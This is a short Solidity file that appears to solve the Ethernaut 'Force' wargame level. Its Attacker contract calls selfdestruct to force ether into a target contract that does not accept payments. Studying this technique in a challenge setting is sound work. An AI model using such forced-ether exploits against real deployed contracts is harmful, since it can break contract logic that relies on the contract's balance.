// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;
import "@levels/Force.sol";

contract Attacker {
    Force public target;

    constructor(address _target) payable {
        target = Force(_target);
    }

    receive() external payable {}

    //! Note that the `selfdestruc` will be deprecated in the future.
    function exploit() public payable {
        selfdestruct(payable(address(target)));
    }
}
